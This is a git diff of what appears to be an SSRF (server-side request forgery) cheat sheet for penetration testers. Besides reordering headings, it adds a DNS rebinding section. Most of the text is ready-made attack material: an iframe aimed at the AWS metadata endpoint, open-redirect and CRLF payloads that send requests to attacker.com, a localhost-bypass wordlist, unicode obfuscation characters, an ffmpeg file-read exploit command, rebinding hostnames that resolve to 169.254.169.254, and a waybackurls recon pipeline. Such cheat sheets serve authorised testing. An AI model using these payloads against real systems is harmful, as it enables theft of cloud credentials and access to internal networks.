@@ -19,7 +19,7 @@ it will send cookies, internal requests, IP. To our server.
 
 SVG to SSRF `https://github.com/allanlw/svg-cheatsheet`
 
-##### AWS Meta Data Service 
+### AWS Meta Data Service 
 SSRF -> AWS Metadata Service
 https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
 `<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
@@ -56,18 +56,6 @@ tfpt://
 gopher://
 ```
 
-### SSRF to XSS
-
-Host a file in attacker server or any where publicly, give that to make an XSS. (the file will contain XSS payload).
-
-### SSRF to FFMPEG
-
-if any Video upload functionality is there in the website we can exploit this.
-
-https://github.com/neex/ffmpeg-avi-m3u-xbin
-
-`./gen_xbin_avi.py file://<filename> file_read.avi`
-
 ## Payloads
 
 ```
@@ -98,10 +86,10 @@ https://github.com/neex/ffmpeg-avi-m3u-xbin
 ?dir={target}
 ```
 
-#### SSRF Chaining
+## SSRF Chaining
 
 Open redirect to SSRF 
-find a file via bruteforce the url parameter  chain with open redirect
+find a file via bruteforce the URL parameter  chain with open redirect
 ```
 example.com/ssrf.php?url=/redirect.php?url=//attacker.com
 ```
@@ -111,8 +99,20 @@ SSRF to CRLF:
 example.com/ssrf.php?url=/test%0d%0aHost:%20attacker.com
 ```
 
-##### Bypassing localhost restrictions from SSRF
+### SSRF to XSS
 
+Host a file in attacker server or any where publicly, give that to make an XSS. (the file will contain XSS payload).
+
+### SSRF to FFMPEG
+
+if any Video upload functionality is there in the website we can exploit this.
+
+https://github.com/neex/ffmpeg-avi-m3u-xbin
+
+`./gen_xbin_avi.py file://<filename> file_read.avi`
+## Bypassing restrictions from SSRF
+
+localhost bypass wordlist
 ```
 https://127.0.0.1/
 https://localhost/
@@ -155,9 +155,23 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
- DNS Rebinding
+#### DNS Rebinding
 
-###### From Wayback urls
+Application code has check for user input data and process if and only domain/IP is not black listed. We will bypass the blacklist with DNS rebinding.
+
+The server will request to the DNS for the IP and it might get cached. So the rebinding host contains 2 DNS records with less TTL. so when we request for that URL multiple times some times it will point to the blacklisted IP(AWS/Localhost). Thus we bypassed the blacklist.
+
+**Approach:** give an IP which is attacker controlled or any public which is allowed and other one is blacklisted (AWS/localhost) and generate such URL with below links.
+
+https://lock.cmpxchg8b.com/rebinder.html
+http://1u.ms/
+
+http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
+
+https://canarytokens.org/nest/
+
+
+## From Wayback urls
 
 ```
 cat all-inscope-domains.txt | waybackurls -dates | grep "https://" | grep "url=" | egrep -v "(.txt|.js|.svg|.jpeg|.jpg|.woff|.woff2|.eot|.css|.png|.ttf|.gif)
